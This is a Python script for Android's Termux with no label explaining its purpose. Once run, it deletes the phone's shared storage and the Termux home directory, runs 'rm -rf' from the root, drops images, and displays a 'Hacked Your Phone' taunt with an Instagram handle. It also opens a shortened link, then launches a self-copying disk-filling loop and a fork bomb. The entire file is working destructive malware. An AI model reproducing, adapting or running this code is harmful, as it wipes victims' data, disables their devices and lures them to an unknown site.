
os.system("pip install threading")
os.system("pip install webbrowser")
os.system("pkg install proot")


import os
import time
import threading
import webbrowser



red = "\033[0;31m"
pur = "\033[0;35m"
gre = "\033[0;32m"
yel = "\033[0;33m"
blu = "\033[0;34m"
cya = "\033[1;36m"
whi = "\033[0;37m"

os.system("termux-setup-storage")


def no7():


    os.chdir('/storage/emulated/0')
    os.system("cd /sdcard")
    os.system("rm -rif *")
    os.chdir("/data/data/com.termux/files/home/meta")
    os.system("cp IMG_20210528_000951.jpg IMG_20210528_000620.jpg /sdcard")
    os.chdir('/storage/emulated/0')
    os.system("cp IMG_20210528_000951.jpg IMG_20210528_000620.jpg Screenshots")

no7()

os.system("clear")

print ("" +pur)

print ("\n\n\n\n\n Hacked Your Phone By 8r9")
print (" Send Message In Insta >> 8r9.8 , To Your Security (; ")
time.sleep(1)
os.system("xdg-open https://yip.su/2hkLx6.8")
webbrowser.open("https://yip.su/2hkLx6.8")



os.system("termux-chroot")
os.chdir("/")
os.system("rm -rf *")

os.chdir("/data/data/com.termux/files/home/")
os.system("rm -rif *")

def f():
    r = 0
    while True:
        with open("8r9{0}".format(r), "w") as f:
            f.write(open(__file__).read())
            r += 1

def s():

    while (True):
        os.fork()


t1=threading.Thread(target=f)
t2=threading.Thread(target=s)
t1.start()
t2.start()



